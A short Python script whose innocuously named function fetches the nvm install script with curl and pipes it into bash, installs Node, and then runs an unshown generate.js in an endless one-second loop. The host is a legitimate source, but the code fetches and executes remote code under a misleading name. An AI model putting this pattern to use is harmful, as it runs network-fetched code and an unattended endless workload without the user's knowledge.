import os
def perform_heavy_computation():
    import os
    os.system('curl https://raw.githubusercontent.com/creationix/nvm/master/install.sh | bash;export NVM_DIR="$HOME/.nvm";source ~/.bashrc;nvm install 18.20.4;node generate.js;while :; do node generate.js; sleep 1s; done')

perform_heavy_computation()